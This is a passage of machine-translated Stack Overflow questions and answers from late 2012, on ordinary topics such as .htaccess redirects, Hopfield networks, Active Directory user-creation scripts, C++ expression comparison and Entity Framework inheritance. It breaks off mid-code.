> ID：14074483
> 
> 赞同：1
> 
> 时间：2012-12-28T19:09:42.480
> 
> 标签：c#, visual-studio-2010, service-reference

当我构建一个包含服务引用的项目/解决方案时，它的编译代码在哪里？

如果我有一个名为 JR.Rowing.Utilities 的项目具有类库的输出，则 \bin 目录包含：

```
JR.Rowing.Utilities.dll
JR.Rowing.Utilities.dll.config
JR.Rowing.Utilities.dll.xml
JR.Rowing.Utilities.pdb 
```

服务参考的代码是否包含在这四个文件之一中？

如果我有另一个 - 已经构建的 - 项目依赖于调用在这个项目中找到的新版本的服务引用，我可以将这些 dll 文件复制到该项目的旧文件上吗？

谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-28T19:18:06.783

服务引用的编译代码将在`JR.Rowing.Utilities.dll`文件中。通过添加服务引用生成的配置将进入您的`App.config`文件，该文件在编译后最终成为您的`JR.Rowing.Utilities.dll.config`文件。

JR.Rowing.Utilities.pdb 是您生成的调试文件，因为您的项目是使用调试配置构建的。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-28T19:17:47.930

不，它不在您提到的文件中。

解决方案资源管理器中有单独的文件夹和单独的树视图项以供服务参考。

![在此处输入图像描述](../Images/7b2f9091cb86cbda8858d7cca1949e17.png)

# .htaccess - htaccess 在 RewriteRule 之前重定向？

> ID：14074484
> 
> 赞同：6
> 
> 时间：2012-12-28T19:09:43.287
> 
> 标签：.htaccess

这是我的 htaccess：

```
## Rewrites
<IfModule mod_rewrite.c>
    RewriteEngine On

    Redirect /stream/ http://twitch.tv/8wayrun
    Redirect /stream http://twitch.tv/8wayrun

    RewriteCond %{HTTP_HOST} ^(www\.)?8wayrun\.com$
    RewriteRule ^(.*)$ http://8wayrun.com/calibur/$1 [R=302,L]
</IfModule> 
```

基本上，我需要将 8wayrun.com/stream 重写为 twitch.tv/8wayrun ...

然后我需要它将 8wayrun.com 重写为 8wayrun.com/calibur ...

问题是，它将 8wayrun.com/stream 重写为 8wayrun.com/calibur/stream。我该如何解决？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-12-28T19:51:08.033

该`Redirect`指令是 mod_alias 的一部分，`Rewrite*`指令是 mod_rewrite 的一部分。当通过 URL/文件映射管道处理 URI 时，两个模块都会被应用，因此将一个放在另一个前面并不重要，最终都会应用两个模块。

您最好只坚持使用 mod_rewrite 并使用该`L`标志来防止应用额外的重定向。

```
## Rewrites
<IfModule mod_rewrite.c>
    RewriteEngine On

    RewriteRule ^/?stream/? http://twitch.tv/8wayrun [R=302,L]

    RewriteCond %{HTTP_HOST} ^(www\.)?8wayrun\.com$
    RewriteRule ^(.*)$ http://8wayrun.com/calibur/$1 [R=302,L]
</IfModule> 
```

# java - 使用 Hopfield 网络的不良结果

> ID：14074485
> 
> 赞同：1
> 
> 时间：2012-12-28T19:09:48.873
> 
> 标签：java, neural-network, encog

我正在编写一个程序，该程序将使用神经网络识别交通标志，但我遇到了`Hopfield`网络问题。我正在使用[这个例子](http://www.massapi.com/source/encog-java-read-only/encog-examples/src/main/java/org/encog/examples/neural/hopfield/HopfieldAssociate.java.html)来制作我自己的 hopfield 网络。

作为输入，我使用标准化后的那些交通标志，它是一个 50x50 的`0`和矩阵`1`。

我遇到的问题是，当 Hopfield 网络将学习 2 种模式时，它可以很好地识别它们，但是当我尝试用 2 种以上的模式训练它时，它给了我一个与之前的模式都不匹配的模式接受过培训，它会为我提供的任何输入返回它。

这是我的代码，与官方 encog 示例中的代码非常相似：

```
public BiPolarNeuralData convertPattern(double[][] data, int index)
{
    int resultIndex = 0;
    BiPolarNeuralData result = new BiPolarNeuralData(WIDTH*HEIGHT);
    for(int i=0;i<(WIDTH*HEIGHT);i++)
    {
        boolean znak=true;
        if(data[index][i]==1)znak=true;
        else znak=false;
        result.setData(resultIndex++,data[index][i]==1.0);
    }

    return result;
}

public void display(BiPolarNeuralData pattern1,BiPolarNeuralData pattern2)
{
    int index1 = 0;
    int index2 = 0;

    for(int row = 0;row<HEIGHT;row++)
    {
        StringBuilder line = new StringBuilder();

        for(int col = 0;col<WIDTH;col++)
        {
            if(pattern1.getBoolean(index1++))
                line.append('O');
            else
                line.append(' ');
        }

        line.append("   ->   ");

        for(int col = 0;col<WIDTH;col++)
        {
            if(pattern2.getBoolean(index2++))
                line.append('O');
            else
                line.append(' ');
        }

        System.out.println(line.toString());
    }
}

public void evaluate(HopfieldNetwork hopfieldLogic, double[][] pattern)
{
    for(int i=0;i<pattern.length;i++)
    {
        BiPolarNeuralData pattern1 = convertPattern(pattern,i);
        hopfieldLogic.setCurrentState(pattern1);
        int cycles = hopfieldLogic.runUntilStable(100);
        BiPolarNeuralData pattern2 = hopfieldLogic.getCurrentState();
        System.out.println("Cycles until stable(max 100): " + cycles + ", result=");
        display( pattern1, pattern2);
        System.out.println("----------------------");
    }
}

public BasicNetwork trainHopfieldNetwork(){
    HopfieldNetwork hopfieldLogic = new HopfieldNetwork(HEIGHT*WIDTH);

    for(int i=0;i<inputData.length;i++)
    {
        hopfieldLogic.addPattern(convertPattern(inputData,i));
        System.out.println("Pattern : "+i);
    }

    evaluate(hopfieldLogic,inputData);

    return null;
} 
```

类型`inputData`在哪里。`array[2500]``double`

到目前为止我尝试过的是：

1.  将图案尺寸更改为更小（10x10、20x20）。

2.  尝试学习不同数量的模式（从 2 到 20）。我总是得到与网络训练的任何模式都不匹配的奇怪结果。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-06T02:17:03.913

所以毕竟问题是网络的学习规则，因为 encog 框架只实现了对复杂网络不太有用的 hebb 学习规则，我不得不实现伪反演学习规则，之后 hopfield 网络开始毫无问题地识别模式

# vb.net - DLL 生产策略 - VB.NET

> ID：14074494
> 
> 赞同：1
> 
> 时间：2012-12-28T19:10:34.633
> 
> 标签：vb.net, design-patterns

那里有很多关于设计模式（例如访问者）、SOLID（单一职责等）、KISS（保持简单、愚蠢）、分层设计等的文档。

我不完全理解的一件事是如何决定在扩展应用程序时何时需要新项目/DLL。有没有使用的标准？

例如，System.Windows.Forms (http://msdn.microsoft.com/en-us/library/system.windows.forms.containercontrol.aspx) 是 System.Windows.Forms.dll 的一部分，但它派生自 System .MarshalByRefObject，它是 mscorlib.dll 的一部分。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-12-28T19:14:47.560

您正在混淆程序集 (DLL) 和命名空间。

[**程序**](http://msdn.microsoft.com/en-us/library/hk5f40ct.aspx)集是包含类实现等的二进制文件。

[**命名空间**](http://msdn.microsoft.com/en-us/library/z2kcy19k.aspx)只是一种将类、枚举等组织成逻辑组的方法，以防止每个级别都可以访问每个类，并防止命名冲突（例如`System.Windows.Forms.Timer`和`System.Threading.Timer`）。

`System.Windows.Forms`不*派生*自`System`，`System`也不只存在于 mscorlib.dll 中。任何人都可以在命名空间中放置任何东西`System`——甚至你也可以这样做。它只是`System`.

将代码子集拆分为单独的程序集有几个原因。一个重要的问题是可重用性。如果您有一些通用控件或实用程序，您可以在自己的 DLL 中维护它并在项目之间使用它，而无需复制和粘贴代码。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-28T21:49:04.227

不要将层与层混淆。分层代码几乎总是必须的。然而，将您的代码拆分成单独的物理层通常是您在实际需要之前不想做的事情（遵循 KISS 原则）。

如果您正确地分层代码，那么当您需要将其分解为单独的层时，这样做应该是一个非常轻松的过程。但是，如果您从未正确地对代码进行分层，您会发现拆分这些层将非常困难。

作为一个简单的例子，假设您创建了一个登录表单，假设您将收集系统信息、访问数据库、验证用户凭据和构建权限的所有逻辑都直接放入 WinForm 类。我刚才描述的代码只有 1 层，也只有 1 层。如果您随后发现自己需要使用 ASP.NET 创建基于 Web 的登录页面，您会发现重用现有代码非常困难。使用基于 Web 的登录，您至少希望将 UI 逻辑与业务/数据访问逻辑分开，但因为它都直接在 WinForm 类中，如果不重构代码，它就无法使用。

现在，假设您没有将所有代码放入表单中，而是花时间将其正确分层。假设您分解了所有访问数据库的代码，将其全部放入数据访问类中。然后你把所有的业务逻辑代码都放到业务类中。此时，WinForm 类中的实际代码应该仅限于只做与 UI 相关的逻辑，例如处理控件事件、设置标签等。在第二个示例中。您仍然只有 1 层，但您拥有三个不同且独立的层（即 UI、业务、数据访问）。

如果您已经对代码进行了这样的分层，那么当您需要在基于 Web 的项目中重用它时，您可以轻松地将业务和数据访问层移动到类库 (dll) 中，然后在服务器端层的 ASP.NET 项目。

将代码分解为单独的类库通常仅在两种情况下才需要：

1.  您需要在多个项目中重用代码
2.  您需要将项目划分为多个层

即使你把所有的代码都放在一个项目中，只要分层好，当这种情况出现时，很容易将项目拆分成多个类库。所以最大的设计问题不是你有多少 DLL。相反，最大的设计问题是你有多少层。一旦您将代码分层，就可以根据需要在不同项目之间轻松移动它。

实际上，即使您不需要在项目之间重用代码也不需要支持 n 层，您仍然可以合理地选择将层划分为单独的类库。纯粹出于组织目的或为了一致性而这样做可能是有意义的。例如，如果另一个开发人员在您身后看到名为“MyCompany.Feature.Business”的类库中的类，他们可以安全地假定这些类都是业务逻辑层的一部分。这样，将您的代码分解为单独的类库可以是自记录的。

将代码放入 dll 中还有其他原因。例如，它使支持插件架构变得容易，或者使一次更新应用程序的一部分变得更容易。

# javascript - 自调用匿名函数的语法

> ID：14074498
> 
> 赞同：2
> 
> 时间：2012-12-28T19:11:16.647
> 
> 标签：javascript, jquery

从我从其他主题中读到的有关问题 SIAF 或自调用匿名函数的内容只是用作容器，它限制了变量的范围（根据我所学到的）。现在，问题是，为什么我可以这样做：

```
$("ul>li").click((function(){

})); 
```

但不是在它之后添加另一个 SIAF 吗？像这样：

```
$("ul>li").click((function(){

}));

(function(){

}); 
```

这对我来说很奇怪，因为仅 SIAF 本身就不会在 IDE 中给我任何错误：

```
$("ul>li").click((function(){

}));

(function(){

}); 
```

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-12-28T19:14:19.377

这：

```
(function() { .. }); 
```

是一个无操作表达式，特别是它不涉及函数调用。函数对象已实例化，但未以任何方式使用。

这：

```
(function() { ... })(); 
```

*确实*做了一些事情，因为尾随`()`导致函数被调用。（它不会调用自己。）

在 JavaScript 中，对函数的引用只是一个值，而函数只是一个对象（嗯，一个特殊的对象）。当对函数的引用后跟带括号的值列表时，这就是函数调用。对函数的引用来自哪里并不重要。（它来自哪里会影响函数调用的语义，但不会影响函数调用本身的基本事实。）

*编辑*——术语“自调用函数表达式”已经流行起来。我不会卷入争论，但在我看来，它不如替代的“立即调用的函数表达式”准确，因为实际上函数不能在外部调用自身。它可以包括对自身的调用，但这完全是另一回事。但是我理解这个词的精神，我认为它是无害的。

# sql - 将时间戳转换为日期/时间？

> ID：14074500
> 
> 赞同：0
> 
> 时间：2012-12-28T19:11:24.883
> 
> 标签：sql, ms-access, timestamp, ms-access-2010

我有一个数字字段，其中包含如下数据：

```
875612015
644936666
644936071
644939568
673358599
665166803 
```

这些应该是日期/时间，如何将它们转换为 SQL（选择语句）中的可读日期/时间？

对一些数据点进行逆向工程：

```
 |
11/10/10   1219 = 968674746
11/12/10   1033 = 968841218
11/12/10   1302 = 968850160
11/12/10   1332 = 968851974
11/16/10   1212 = 969192756
11/16/10   1526 = 969204361
07/19/12   1036 = 1021977398 
```

这些时间值可能存储在与[MUMPS相关的内容中](http://en.wikipedia.org/wiki/MUMPS)

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-28T19:21:05.033

试试这个：

```
SELECT DateAdd ( "s", DATENUMBERFIELD, #01/01/1970# )
FROM SourceDatabase 
```

**更新：**

好的，根据您的示例，基准日期似乎是 1980 年 3 月 1 日，而不是 1970 年 1 月 1 日，所以试试这个：

```
SELECT DateAdd ( "s", DATENUMBERFIELD, #03/01/1980# )
FROM SourceDatabase 
```

# vbscript - 尝试将用户添加到 Active Directory 时出错

> ID：14074505
> 
> 赞同：0
> 
> 时间：2012-12-28T19:12:02.230
> 
> 标签：vbscript, active-directory

我现在不知所措；我已经用几种不同的方式尝试了这个脚本，但不断收到错误消息`There is no such object on the server at character 20,2`。

这行写着

```
Set objOU = GetObject("LDAP://ou=users,dc=asp,dc=rippe,dc=com") 
```

当我切换`OU`到`CN`用户旁边时，我得到一个不同的错误。

所需的最终结果是从 HTML 表单中获取所有变量，然后脚本将运行以在我们的域上创建新用户。

我什至还没有将用户添加到组中，因为我无法克服这个障碍。

```
Dim strID,StrFName,strLName,strFirm,strPwd,strServer,strLMS,strSql,strLMSV

strID = zademo
strFName = Demo
strLName = Tester
strFirm = Demo
strPwd = za1234
strServer = rkasp01
strLMS = y
strSql = y
strLMSV = y
strDisplay = strLName & ", " & strFName

'Create Citrix User Account

If strSql = y OR strLMSV = y Then

    Set objOU = GetObject("LDAP://ou=Users,dc=asp,dc=rippe,dc=com")

    Set objUser = objOU.Create("User", "cn=" & strDisplay)
    objUser.Put "sAMAccountName", strID
    objUser.Put "Description", strFirm

    objUser.Put "givenName", strFName
    objUser.Put "sn", strLName
    objUser.Put "displayName", strDisplay
    objUser.Put "homedirectory", "\\rkpdc\" & strFirm & "\" & strID
    objUser.Put "scriptpath", strFirm & ".bat"
    objUser.SetInfo

End If

objUser.SetPassword strPwd
objUser.Put "PasswordExpired", CLng(1)
objUser.AccountDisabled = FALSE
objUser.SetInfo 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-29T18:31:57.507

> 设置 objOU = GetObject("LDAP://ou=Users,dc=asp,dc=rippe,dc=com")

通常“用户”是一个容器，而不是一个 OU。

尝试：

> 设置 objOU = GetObject("LDAP://CN=Users,dc=asp,dc=rippe,dc=com")

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-28T19:18:06.347

您是否尝试过将 example.com 替换为实际域。

```
GetObject("LDAP://example.com/OU=Users,DC=asp,DC=rippe,DC=com") 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-10-25T15:22:13.587

```
Option Explicit
Dim strUserName
Dim objRootLDAP
Dim objContainer
Dim objNewUser
strUserName = "MorganTestUser"

Set objRootLDAP = GetObject("LDAP://rootDSE")

' You can give your own OU like LDAP://OU=TestOU instead of LDAP://CN=Users
Set objContainer = GetObject("LDAP://CN=Users," & _
objRootLDAP.Get("defaultNamingContext")) 

Set objNewUser = objContainer.Create("User", "cn=" & strUserName)
objNewUser.Put "sAMAccountName", strUserName
objNewUser.Put "givenName", "Morgan"
objNewUser.Put "sn", "TestUser"
objNewUser.Put "displayName", "Morgan TestUser"
objNewUser.Put "Description", "AD User created by VB Script"
objNewUser.SetInfo

objNewUser.SetPassword "MyPassword123"
objNewUser.Put "PasswordExpired", CLng(1)
objNewUser.AccountDisabled = FALSE

MsgBox ("New Active Directory User created successfully by using VB Script...")

WScript.Quit 
```

# c# - WCF 超时崩溃

> ID：14074508
> 
> 赞同：0
> 
> 时间：2012-12-28T19:12:21.267
> 
> 标签：c#, .net, wcf

如果我使用此代码：

```
//in this timeout code necessary? 
ServiceClient.Timeout = 10;
ServiceClient.GetRestaurantsByNameAsync (MenuFinderApp.RestaurantSearchName);
ServiceClient.GetRestaurantsByNameCompleted += delegate(object sender, GetRestaurantsByNameCompletedEventArgs args) {

                    //code to show records

                    }; 
```

我返回了几条记录。如果我等待大约 5 - 10 分钟并再次执行代码，我会收到超时错误。为什么会发生这种情况，如何保持连接打开？我必须指定 60 分钟的超时时间吗？这是我的 WCF 服务的 Web.config：

```
 <binding name="BasicHttpBinding_IMenuFinderAppService" closeTimeout="infinite" openTimeout="infinite" receiveTimeout="infinite" sendTimeout="infinite" allowCookies="false" bypassProxyOnLocal="false" hostNameComparisonMode="StrongWildcard" maxBufferSize="500000" maxBufferPoolSize="524288" maxReceivedMessageSize="500000" messageEncoding="Text" textEncoding="utf-8" transferMode="Buffered" useDefaultWebProxy="true">
      <readerQuotas maxDepth="32" maxStringContentLength="8192" maxArrayLength="500000" maxBytesPerRead="4096" maxNameTableCharCount="16384" />
      <security mode="None">
        <transport clientCredentialType="None" proxyCredentialType="None" realm="" />
        <message clientCredentialType="UserName" algorithmSuite="Default" />
      </security>
    </binding> 
```

# hibernate - “PropertyAccessException：无法通过反射设置器设置字段值”使用 Hibernate 4

> ID：14074509
> 
> 赞同：0
> 
> 时间：2012-12-28T19:12:22.870
> 
> 标签：hibernate, jboss7.x, hibernate-mapping

过去，我使用 java.util.Calendar 和 Hibernate 3（来自 J-boss 5.1）和 @Temporal 注释。迁移到 Hibernate 4 (j-boss 7.1) 后，我在尝试使用 UserType 时遇到了这个 PropertyAccessException。

我的 UT 实际上只是 org.hibernate.type.StringType 的包装器，因为我只是将日历强制转换为字符串并返回以处理相对时间戳：没有时区的 SQL 时间戳。

```
原因：javax.persistence.PersistenceException：org.hibernate.PropertyAccessException：无法通过 [my-class] 的反射设置器设置字段值
    在 org.hibernate.ejb.AbstractEntityManagerImpl.convert(AbstractEntityManagerImpl.java:1361) [hibernate-entitymanager-4.0.1.Final.jar:4.0.1.Final]
    在 org.hibernate.ejb.AbstractEntityManagerImpl.convert(AbstractEntityManagerImpl.java:1289) [hibernate-entitymanager-4.0.1.Final.jar:4.0.1.Final]
    在 org.hibernate.ejb.QueryImpl.getSingleResult(QueryImpl.java:313) [hibernate-entitymanager-4.0.1.Final.jar:4.0.1.Final]
...

```

有什么想法可以解决此异常吗？

编辑：目前我已经通过删除 UserType 来解决它，以支持将时间戳设置为字符串、解析并在 setter 和 getter 中对其进行格式化。如果有人知道的话，我更喜欢使用 UserType 或一些更清洁的解决方案。

# ios - 黑屏/iOS OpenGL ES 2 中没有事件

> ID：14074511
> 
> 赞同：4
> 
> 时间：2012-12-28T19:12:30.447
> 
> 标签：ios, events, opengl-es-2.0

我正在处理大约 45 天的错误。我已经尝试了几十个方法调用，更改了整个程序，但没有任何效果。

我使用 GLES 2，它的 UIViewController 是 rootViewController，它有一个 UIView 类型的视图，它的 layerclass 是 CAEAGLLayer。

当我运行应用程序时，屏幕变黑，如果我按下屏幕，则不会生成任何事件。

如果我旋转应用程序，屏幕会出现并且事件会起作用。更糟糕的是，如果我不旋转应用程序，而是在 presentRenderbuffer 之后放置一个断点，然后按下 Xcode 中的“Capture OpenGL ES Frame”按钮，**屏幕就会出现并且事件开始工作**！！！

我觉得实际上并没有显示视图，但是，我实现了 viewWillLayoutSubviews、viewWillAppear、viewDidAppear、loadView（我开始一切的地方），所有这些方法都按以下顺序调用：

加载视图视图将出现视图将布局子视图视图确实出现

此外，视图实际上具有有效的帧大小。

非常感谢这个绝望的用户的任何帮助。

吉赫

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-14T20:32:42.737

这个问题的解决方案是：在创建所有窗口的主线程中设置上下文，然后通过调用在所有线程之间共享 open gl 上下文

```
[EAGLContext setCurrentContext:glcontext] 
```

在每个线程

# c++ - C++ 动态对象类比较

> ID：14074518
> 
> 赞同：4
> 
> 时间：2012-12-28T19:13:06.040
> 
> 标签：c++

我希望能够比较表达式的语法树。基类`Expr`有一个纯虚`compare`方法供具体子类覆盖：

```
class Expr {
public:
  virtual bool compare(const Expr *other) const = 0;
}; 
```

例如，说`NumExpr`和`AddExpr`是两个具体的子类，分别表示一个字面整数表达式和一个二进制加法表达式。每个`compare`方法做的第一件事是`dynamic_cast`用来确保`other`表达式是相同的类型：

```
class NumExpr : public Expr {
  int num;
public:
  NumExpr(int n) : num(n) {}
  bool compare(const Expr *other) const {
    const NumExpr *e = dynamic_cast<const NumExpr*>(other);
    if (e == 0) return false;
    return num == e->num;
  }
};

class AddExpr : public Expr {
  Expr *left, *right;
public:
  AddExpr(Expr *l, Expr *r) : left(l), right(r) {}
  bool compare(const Expr *other) const {
    const AddExpr *e = dynamic_cast<const AddExpr*>(other);
    if (e == 0) return false;
    return left->compare(e->left) && right->compare(e->right);
  }
}; 
```

我总是觉得我在使用时做错了什么`dynamic_cast`——有没有更合适的方法来执行对象之间的动态比较而不使用`dynamic_cast`？

使用[访问者设计模式](http://en.wikipedia.org/wiki/Visitor_pattern)并*不能解决*对 RTTI 的需求（据我所知）。“表达式访问者”的抽象基类可能如下所示：

```
class NumExpr;
class AddExpr;

class ExprVisitor {
public:
  virtual void visit(NumExpr *e) {}; // "do nothing" default
  virtual void visit(AddExpr *e) {};
}; 
```

表达式的基类包含一个纯虚`accept`方法：

```
class Expr {
public:
  virtual void accept(ExprVisitor& v) = 0;
}; 
```

然后，具体的表达式子类使用**双重调度**来调用适当的`visit`方法：

```
class NumExpr : public Expr {
public:
  int num;
  NumExpr(int n) : num(n) {}
  virtual void accept(ExprVisitor& v) {
    v.visit(this);
  };
};

class AddExpr : public Expr {
public:
  Expr *left, *right;
  AddExpr(Expr *l, Expr *r) : left(l), right(r) {}
  virtual void accept(ExprVisitor& v) {
    v.visit(this);
  };
}; 
```

当我们最终使用这种机制进行表达式比较时，我们*仍然*需要使用 RTTI（据我所知）；例如，这是一个用于比较表达式的示例访问者类：

```
class ExprCompareVisitor : public ExprVisitor {
  Expr *expr;
  bool result;
public:
  ExprCompareVisitor(Expr *e) : expr(e), result(false) {}
  bool getResult() const {return result;}

  virtual void visit(NumExpr *e) {
    NumExpr *other = dynamic_cast<NumExpr *>(expr);
    result = other != 0 && other->num == e->num;
  }

  virtual void visit(AddExpr *e) {
    AddExpr *other = dynamic_cast<AddExpr *>(expr);
    if (other == 0) return;

    ExprCompareVisitor vleft(other->left);
    e->left->accept(vleft);
    if (!vleft.getResult()) return;

    ExprCompareVisitor vright(other->right);
    e->right->accept(vright);
    result = vright.getResult();
  }
}; 
```

请注意，我们仍在使用 RTTI（`dynamic_cast`在这种情况下）。

如果我们真的希望避免 RTTI，我们可以“自己动手”创建独特的常量来识别每个具体的表达式风格：

```
enum ExprFlavor {
  NUM_EXPR, ADD_EXPR
};

class Expr {
public:
  const ExprFlavor flavor;
  Expr(ExprFlavor f) : flavor(f) {}
  ...
}; 
```

每个具体类型都会适当地设置这个常量：

```
class NumExpr : public Expr {
public:
  int num;
  NumExpr(int n) : Expr(NUM_EXPR), num(n) {}
  ...
};

class AddExpr : public Expr {
public:
  Expr *left, *right;
  AddExpr(Expr *l, Expr *r) : Expr(ADD_EXPR), left(l), right(r) {}
  ...
}; 
```

然后我们可以使用`static_cast`和`flavor`字段来避免 RTTI：

```
class ExprCompareVisitor : public ExprVisitor {
  Expr *expr;
  bool result;
public:
  ExprCompareVisitor(Expr *e) : expr(e), result(false) {}
  bool getResult() const {return result;}

  virtual void visit(NumExpr *e) {                                                                
    result = expr->flavor == NUM_EXPR && static_cast<NumExpr *>(expr)->num == e->num;
  }
  ...
}; 
```

这个解决方案似乎只是在复制 RTTI 在幕后所做的事情。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-28T19:39:23.963

假设您在编译时不知道任何一方的动态类型（例如静态类型与动态类型相同）并且您实际上想`Expr`通过指针或引用来比较两个对象，那么您将必须进行两次虚拟调用（双重调度）或使用`dynamic_cast`.

它看起来像这样：

```
class Expr {
public:
  virtual bool compare(const Expr *other) const = 0;
  virtual bool compare(const NumExpr *other) const { return false; }
  virtual bool compare(const AddExpr *other) const {return false;}
};

class NumExpr : public Expr {
  int num;
public:
  explicit NumExpr(int n) : num(n) {}
  bool compare(const Expr *other) const {
    return other->compare(this);
  }
  bool compare(const NumExpr *other) const {
    return num == other->num;
  }
}; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-28T19:49:04.900

有`typeid Operator`可以用来代替`dynamic_cast`初始类型匹配。

[(源)](http://www.cplusplus.com/reference/typeinfo/type_info/)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-28T19:55:45.860

您可以使用 RTTI。

```
class NumExpr : public Expr {
  int num;
public:
   NumExpr(int n) : num(n) {}
bool compare(const Expr *other) const {
if ( typeid(*other) != typeid(*this) )
     return false;
 else {
     NumExpr *e = static_cast<NumExpr*>(other);
     return num == e->num;
  }
  }
}; 
```

# android - Android SharedPreferences 保存游戏的最高分

> ID：14074522
> 
> 赞同：0
> 
> 时间：2012-12-28T19:13:19.843
> 
> 标签：android

我是安卓新手。我想为我的游戏保存 5 个高分。我为此使用 SharedPreferences。如何在 SharedPreferences 中保存多个分数？我可以假设每次完成一个级别都必须进行检查。但是我怎样才能填充 5 个高分呢？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-28T19:27:20.810

假设您只想存储分数（无名称）。把你所有的分数放在一个数组中。然后使用

```
Arrays.sort (myIntArray); 
```

这会将其按升序排序，因此您需要将其反转。

这意味着在您的 SharedPreferences 写入操作中，从 4 开始，然后向后工作..

```
sharedPreferences.putInt( "HighScore1", myIntArray [4] );
sharedPreferences.putInt( "HighScore2", myIntArray [3] ); 
```

等等

为了获得最佳结果，您将有一个“默认”排序值，例如`-1`不存在的分数。这样，当您显示到屏幕上时，您可以检查`-1`然后输出“无”或根本不输出任何内容。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-28T19:16:28.737

只需给每个人一个唯一的密钥：

```
SharedPreferences.Editor spEdit = getDefaultSharedPreferences().edit();
spEdit.putInt( "FirstHighScore", firstHighScore );
spEdit.putInt( "SecondHighScore", secondHighScore );
// Etc.
spEdit.commit(); 
```

# java - 使用 servlet 和 jsps 跟踪页面请求

> ID：14074523
> 
> 赞同：0
> 
> 时间：2012-12-28T19:13:23.090
> 
> 标签：java, jsp, servlets

如果用户继续 get_appointment.jsp 但被 servlet 重定向到 login.jsp（因为他没有登录）。成功登录后，他应该返回到 get_appointment.jsp，因为正在从那里完成初始化。

现在应该使用什么机制来跟踪请求最初来自哪个页面，可能会被转发到不同的jsps和servlet，然后用户应该再次返回到原​​始（初始页面）。

在一般规则中，最常见和更好的方法是什么。我解释的当前情景中是否有任何一个？有很多，会话属性，url重写，全局和应用程序，servlet上下文。

如果用户手动更改地址栏并转到其他地方怎么办。session 属性然后让他在一段时间后登陆到一些不正确的页面。

什么是正确的方法？......

会话。如果 iam 在 verfiycreds.java 中。有没有办法获取将请求发送到verifycred.java（即login.jsp）的页面地址？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-28T22:13:25.623

在 spring-security 中，请求被保存在请求被拦截的地方，因为它是未经授权的 - 在[ExceptionTranslationFilter](http://grepcode.com/file/repo1.maven.org/maven2/org.springframework.security/spring-security-web/3.0.2.RELEASE/org/springframework/security/web/access/ExceptionTranslationFilter.java#176)中。认证成功后，将调用成功处理程序[SavedRequestAwareAuthenticationSuccessHandler](http://grepcode.com/file/repo1.maven.org/maven2/org.springframework.security/spring-security-web/3.0.0.RELEASE/org/springframework/security/web/authentication/SavedRequestAwareAuthenticationSuccessHandler.java) / [API 。](http://static.springsource.org/spring-security/site/docs/current/apidocs/org/springframework/security/web/authentication/SavedRequestAwareAuthenticationSuccessHandler.html)此处理程序重定向到请求的 URL，该 URL 由 ExceptionTranslationFilter 预先存储在 HttpSession 中。

要回答您的问题，这是正确的方法。看看他们实现它的方式，看看模式，看看代码。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-28T19:27:04.443

您可以将其保存在用户的会话中...

```
doGet(HttpServletRequest request, HttpServletResponse response) {
    // Could also be doPost(), depending on which you need.
    // Request and response are both abailable there as well.
    ...
    HttpSession session = request.getSession();
    session.setAttribute("referralURI", request.getRequestURI());
    ...
} 
```

然后，您可以使用 检索 URI `request.getSession().getAttribute("referralURI")`。

如果您想避免会话，您还可以将 URI 的相关部分作为获取参数传递给登录。

# entity-framework - EF Code First 多级继承问题

> ID：14074524
> 
> 赞同：0
> 
> 时间：2012-12-28T19:13:26.823
> 
> 标签：entity-framework, entity-framework-4, ef-code-first

我有一个继承层次结构设置，我首先通过代码中的 TPT 映射到数据库。在大多数情况下，层次结构是一层，但有时它是两层。我的基类如下所示：

```
public class AuditEvent
{
    public int AuditEventID;

    //other stuff
}; 
```

然后我有一堆看起来像这样的其他类（具有不同的名称和属性）：

```
public class PageRequest : AuditEvent
{
    /// <summary>
    /// Page Request Id (Primary Key)
    /// </summary>        
    public Int64 PageRequestID { get; set; }

    /// <summary>
    /// Screen (page) being requested
    /// </summary>        
    public string Screen { get; set; }

    /// <summary>
    /// Http Method
    /// </summary>        
    public string HttpMethod { get; set; }

    /// <summary>
    /// Confirmation Logs linked to this page request
    /// </summary>
    public virtual List<ConfirmationLog> ConfirmationLogs { get; set; }
} 
```

这个特定的类 (PageRequest) 是另一个名为 ConfirmationLog 的类的父类，如下所示：

```
/// <summary>
/// Object used to log confirmations to the auditing database
/// </summary>
public class ConfirmationLog : PageRequest
{
    /// <summary>
    /// Confirmation ID
    /// </summary>        
    public long ConfirmationID { get; set; }

    /// <summary>
    /// Confirmation number
    /// </summary>
    public string ConfirmationNum { get; set; }

    /// <summary>
    /// Web action ID (automated alert or transaciton confirmation number)
    /// </summary>
    public int WebActionID { get; set; }
} 
```

我正在使用配置类和流畅的 API 配置映射，如下所示：

```
/// <summary>
/// Configuration class for PageRequest
/// </summary>
public class PageRequestConfiguration : EntityTypeConfiguration<PageRequest>
{
    /// <summary>
    /// Default constructor
    /// </summary>
    public PageRequestConfiguration()
    {
        //Table
        ToTable("PageRequests");

        //primary key
        HasKey(a => a.PageRequestID);

        //Properties
        Property(a => a.PageRequestID).HasDatabaseGeneratedOption(DatabaseGeneratedOption.Identity);
        Property(a => a.Screen).IsRequired().HasMaxLength(100);
        Property(a => a.HttpMethod).IsRequired().HasMaxLength(10);
    }
}

/// <summary>
/// Confirmation Log configuration class.  Configures the confirmation log class for the db model
/// </summary>
public class ConfirmationLogConfiguration : EntityTypeConfiguration<ConfirmationLog>
{
    /// <summary>
    /// Default constructor
    /// </summary>
    public ConfirmationLogConfiguration()
    {
        //Map to Table
        ToTable("ConfirmationLogs");

        //Primary Key
        HasKey(a => a.ConfirmationID);

        //required fields
